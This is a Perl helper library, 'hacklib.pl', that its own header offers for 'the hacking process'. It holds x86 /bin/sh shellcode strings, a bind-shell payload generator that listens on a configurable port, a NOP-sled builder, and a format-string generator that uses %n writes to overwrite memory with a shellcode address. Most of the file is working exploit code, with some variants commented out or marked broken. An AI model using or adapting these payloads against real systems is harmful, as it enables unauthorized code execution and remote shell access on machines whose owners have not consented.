#!/usr/bin/perl -w
#	Version 1.3
#
#  hacklib.pl makes available various helper subs for the hacking process.  'do "hacklib.pl";'
#
#	xw(String)	- takes in a 4-byte string parameter(with/wo "0x"), returns little-endian DWORD
#				xw("0x080489af")
#	genshell(#,#[,#])	- Takes in which shell, overall size, and size of front NOP sled.
#	
#	genformatstring('0xoverwrittenaddress', '0xshellcodeaddress' [, offset])
#			- creates a format string which will overwrite the first address location with the second
#				address
#				offset allows you to adjust where the address is located due to prepended bytes
#						(as in --inline)
use strict;

my @SHELLS;
my @NETBIND;

#shell of unknown origin...
push(@SHELLS,"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68");

#shell of unknown origin...
push(@SHELLS,"\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00");


#from http://shellcode.org/Shellcode/BSD/bsd-shellcode.html
push(@SHELLS,"\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcc\x80");


# from $ebp in reverse  #BROKEN#
push(@SHELLS,"\xc7\x45\xd8" . "\x90\x90\x31\xc0" . "\xc7\x45\xdc" . "\x50\x50\x50\xb0" . "\xc7\x45\xe0" . "\x17\xcc\x80\x31" . "\xc7\x45\xe4" . "\xc0\x50\x68\x2f" . "\xc7\x45\xe8" . "\x2f\x73\x68\x68" . "\xc7\x45\xec" . "\x2f\x62\x69\x6e" . "\xc7\x45\xf0" . "\x89\xe3\x50\x54" . "\xc7\x45\xf4" . "\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\xfe\x45\xe1" . "\x8d\x55\xd8" . "\xff\xe2");

#from $ebp forward
push(@SHELLS,"\xc7\x45\x24" . "\x90\x90\x31\xc0" . "\xc7\x45\x28" . "\x50\x50\x50\xb0" . "\xc7\x45\x2c" . "\x17\xcc\x80\x31" . "\xc7\x45\x30" . "\xc0\x50\x68\x2f" . "\xc7\x45\x34" . "\x2f\x73\x68\x68" . "\xc7\x45\x38" . "\x2f\x62\x69\x6e" . "\xc7\x45\x3c" . "\x89\xe3\x50\x54" . "\xc7\x45\x40" . "\x53\x50\xb0\x3b" . "\xc7\x45\x44" . "\xcc\x80\x31\xc0" . "\xc7\x45\x48" . "\xb0\x01\xcc\x80" . "\xfe\x45\x44" . "\xfe\x45\x4a" . "\xfe\x45\x2d" . "\x8d\x55\x24" . "\xff\xe2");

# Inplace editing using jmp/call/pop method!
push(@SHELLS,"\xeb\x30\x5b" . "\xfe\x43\xf9\xfe\x43\xf3\xfe\x43\xdc" . "\x31\xc0\x50\x50\x50\xb0\x17\xcc\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcc\x80\x31\xc0\xb0\x01\xcc\x80" . "\xe8\xcb\xff\xff\xff");



#  23:   c7 44 24 04 c3 c9 80    movl   $0xcc80c9c3,0x4(%esp)
#  2a:   cc
#  2b:   fe 44 24 04             incb   0x4(%esp)
#  2f:   ff 54 24 04             call   *0x4(%esp)
#  33:   ff 64 24 04             jmp    *0x4(%esp)
#  37:   c7 44 24 fc c3 c9 80    movl   $0xcc80c9c3,0xfffffffc(%esp)
#  3e:   cc
#  3f:   8d 54 24 fc             lea    0xfffffffc(%esp),%edx
#  43:   fe 44 24 fc             incb   0xfffffffc(%esp)



#from $esp forward    #BROKEN#
push(@SHELLS,"\xc7\x44\x24\x08" . "\x90\x90\x31\xc0" . "\xc7\x44\x24\x0c" . "\x50\x50\x50\xb0" . "\xc7\x44\x24\x10" . "\x17\xcc\x80\x31" . "\xc7\x44\x24\x14" . "\xc0\x50\x68\x2f" . "\xc7\x44\x24\x18" . "\x2f\x73\x68\x68" . "\xc7\x44\x24\x1c" . "\x2f\x62\x69\x6e" . "\xc7\x44\x24\x20" . "\x89\xe3\x50\x54" . "\xc7\x44\x24\x24" . "\x53\x50\xb0\x3b" . "\xc7\x44\x24\x28" . "\xcc\x80\x31\xc0" . "\xc7\x44\x24\x2c" . "\xb0\x01\xcc\x80" . "\xfe\x44\x24\x28" . "\xfe\x44\x24\x2e" . "\xfe\x44\x24\x11" . "\x8d\x54\x24\x08" . "\xff\xe2");

# Network Bind
my $shell = netShell(1365); 
push(@SHELLS, $shell);


sub genNOP {
 my $NOPS = "ABCHKIJ@";
 my $sled = "";
 for (my $i = shift ; $i > 0 ; $i--){
  $sled .= substr($NOPS,rand(length($NOPS)),1);
 } 
 return $sled;
}


sub genshell {

 my $shellno = shift || 1;
 my $size = shift || -1;
 my $front = shift || -1;
 my $rear = 0;

 my $diff = $size - length($SHELLS[$shellno-1]);
 $diff = 30 if ($size == -1);
 die("Too Small! Size=" . length($SHELLS[$shellno-1])) if ($diff < 0);

 if ($front == -1) {
  $front = $diff;
  $rear = 0;
 } else {
##### "-" means the third parameter determines the size of NOPs *after* the shellcode
  if ($front < -1){
   $front = $diff + $front;
   $rear = $diff - $front;
  } else {
##### otherwise, the third parameter determines the size of the NOPs *before* the shellcode
   $rear = $diff - $front;
  }
 }
 die("WRONG!! Size=" . length($SHELLS[$shellno-1]) . " and $front and $rear are too big!") if (($front + $rear) > $diff);
 die("WRONG!! Size=" . length($SHELLS[$shellno-1]) . " and $front is too big to go on the front!") if (($rear <0));
 die("WRONG!! Size=" . length($SHELLS[$shellno-1]) . " and $rear is too big to tag on the end!") if (($front <0));

 my $SHELLCODE = genNOP($front) . $SHELLS[$shellno-1] . genNOP($rear);

# MY Own additions:
#   0:   c7 45 04 cc 80 c9 c3    movl   $0xcc80c9c3,0x4(%ebp)
#   7:   fe 45 04                incb   0x4(%ebp)
#   a:   ff 55 04                call   *0x4(%ebp)


# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\x04\xc3\xc9\x80\xcc\xfe\x45\x07\xff\x65\x04" . "\x31\xc0\xb0\x01\x90". "\x90"x2;

#  12:   c7 45 fc c3 c9 80 cc    movl   $0xcc80c9c3,0xfffffffc(%ebp)
#  19:   8d 55 fc                lea    0xfffffffc(%ebp),%edx
#  1c:   fe 45 fc                incb   0xfffffffc(%ebp)
#  1f:   ff e2                   jmp    *%edx
#  21:   c9                      leave
#  22:   c3                      ret

# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xfc\xcc\x80\xc9\xc3\x8d\x55\xfc\xfe\x45\xfc\xff\xe2" . "\x31\xc0\xb0\x01\x90";

#        c7 45 f8 cc 80 31 c0    movl   $0xcc80c9c3,0xfffffff4(%ebp)
#        c7 45 fc b0 01 cc 80    movl	$0x31c0b001,0xfffffff8(%ebp)
#        fe 45 fa                incb   0xfffffffa(%ebp)
#        fe 45 ff                incb   0xffffffff(%ebp)
#        8d 55 f8                lea    0xfffffff8(%ebp),%edx
#        ff e2                   jmp    *%edx



# my $SHELLCODE = "\x90"x30 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xfa" . "\xfe\x45\xff" . "\x8d\x55\xf4" . "\xff\xe2"; 


# my $SHELLCODE = "\x90"x34 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\x8d\x55\xf8" . "\xff\xe2"; 

#  Now, let's put the whole code into arbitrary memory space.

# my $SHELLCODE = "\x90"x44 . "\xc7\x45\xd8" . "\x90\x90\x31\xc0" . "\xc7\x45\xdc" . "\x50\x50\x50\xb0" . "\xc7\x45\xe0" . "\x17\xcc\x80\x31" . "\xc7\x45\xe4" . "\xc0\x50\x68\x2f" . "\xc7\x45\xe8" . "\x2f\x73\x68\x68" . "\xc7\x45\xec" . "\x2f\x62\x69\x6e" . "\xc7\x45\xf0" . "\x89\xe3\x50\x54" . "\xc7\x45\xf4" . "\x53\x50\xb0\x3b" . "\xc7\x45\xf8\xcc\x80\x31\xc0" . "\xc7\x45\xfc\xb0\x01\xcc\x80" . "\xfe\x45\xf8" . "\xfe\x45\xfe" . "\xfe\x45\xe1" . "\x8d\x55\xd8" . "\xff\xe2"; 

 return($SHELLCODE);
}

sub genshell2 {
 my $SHELLCODE = "\x90"x30 . "\xeb\x1f\x5e\x31\xc0\x89\x46\xf5\x88\x46\xfa\x89\x46\x0c\x89\x76\x08\x50\x8d\x5e\x08\x53\x56\x56\xb0\x3b\x9a\xff\xff\xff\xff\x07\xff\xe8\xdc\xff\xff\xff/bin/sh\x00";

# my $SHELLCODE = "\x90"x16 . "\x31\xc0\x50\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"; 

# MY Own additions:
#   0:   c7 45 04 c3 c9 80 cc    movl   $0xcc80c9c3,0x4(%ebp)
#   7:   fe 45 04                incb   0x4(%ebp)
#   a:   ff 55 04                call   *0x4(%ebp)


 #my $SHELLCODE = "\x90"x16 . "\x31\xc0\x50\x50\x50\xb0\x17\x90\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b" . "\xc7\x45\x04\xc3\xc9\x80\xcc\xfe\x45\x07\xff\x55\x04" . "\x31\xc0\xb0\x01\x90". xw("0x2814dd00") . "\xCC\x90";


 return($SHELLCODE);
}

sub netbind {
}

sub print_hex_reverse {
 my $input = shift;
 my $output = "";
 
 my $inputstring = sprintf("%08x", $input);

 if (substr($inputstring,1,1) eq "x") {
  $input = substr($inputstring,2);
 }

 my $b1 = substr($inputstring,0,2);
 my $b2 = substr($inputstring,2,2);
 my $b3 = substr($inputstring,4,2);
 my $b4 = substr($inputstring,6,2);

 printf(STDERR "Reversed Hex: %02x%02x%02x%02x\n", hex($b4), hex($b3), hex($b2), hex($b1));
 return (chr(hex($b4)).chr(hex($b3)).chr(hex($b2)).chr(hex($b1)));
}

sub print_format_string {
 my $address = shift;
 my $offset = shift || 0;
 my $output = "";
 my $saddress = sprintf("%08x", $address);
 my $decimal = 0;
 
 if (substr($saddress,1,1) eq "x") {
  $saddress = substr($saddress,2);
 }
 my $b1 = substr($saddress,0,2);
 my $h1 = hex($b1);
 my $b2 = substr($saddress,2,2);
 my $h2 = hex($b2);
 my $b3 = substr($saddress,4,2);
 my $h3 = hex($b3);
 my $b4 = substr($saddress,6,2);
 my $h4 = hex($b4);
 
 $decimal = -16 + $h4;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (4+$offset) . '$n';

 $decimal = $h3-$h4;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (5+$offset) . '$n';

 $decimal = $h2-$h3;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (6+$offset) . '$n';

 $decimal = $h1-$h2;
 if ($decimal < 1){
  $decimal +=256;
 }
 $output .=  "%" .($decimal)."x%". (7+$offset) . '$n';

 return $output;
}

sub genformatstring {
 my $firstvar = $_[0];
 my @prefix;
 if ($firstvar eq "--inline") {
  shift;
 # while (<STDIN>){
 #  print (STDOUT $_);
 # }
  @prefix = <STDIN>;
 }
 my $overwriteaddress = hex(shift);
 my $withaddress = hex(shift);
 my $offset = shift || 0;


 printf(STDERR "Format String to overwrite the four bytes at %08x with %08x\n", $overwriteaddress, $withaddress);
 print(STDERR "\nFour memory locations of interest:\n");

 print(print_hex_reverse($overwriteaddress));
 print(print_hex_reverse($overwriteaddress+1));
 print(print_hex_reverse($overwriteaddress+2));
 print(print_hex_reverse($overwriteaddress+3));
 for my $line (@prefix){
  chomp($line);
  print($line);
 }
 print(print_format_string($withaddress));

}

sub xw {
 my $address = shift;
 my $ret = "";

 if (substr($address,1,1) eq "x"){ $address = substr($address,2);}
 if (substr($address,0,1) eq "x"){ $address = substr($address,1);}

 for ( my $i = length($address); $i>0 ; $i=$i-2){
  my $byte = substr($address, $i-2, 2);
  $ret .= chr(hex($byte));
 }
 return $ret;
}


sub netShell {
        my $port = shift;
        my $off_port = 0x8;
        my $port_bin = pack('n', $port);

        my $shellcode =
                "\x6a\x61\x58\x99\x52\x68\x10\x02\xbf\xbf\x89\xe1\x52\x42\x52\x42" .
                "\x52\x6a\x10\xcd\x80\x99\x93\x51\x53\x52\x6a\x68\x58\xcd\x80\xb0" .
                "\x6a\xcd\x80\x52\x53\x52\xb0\x1e\xcd\x80\x97\x6a\x02\x59\x6a\x5a" .
                "\x58\x51\x57\x51\xcd\x80\x49\x79\xf5\x50\x68\x2f\x2f\x73\x68\x68" .
                "\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x53\xb0\x3b\xcd\x80";

        substr($shellcode, $off_port, 2, $port_bin);

        return($shellcode);
}


#print(xw(shift));

1
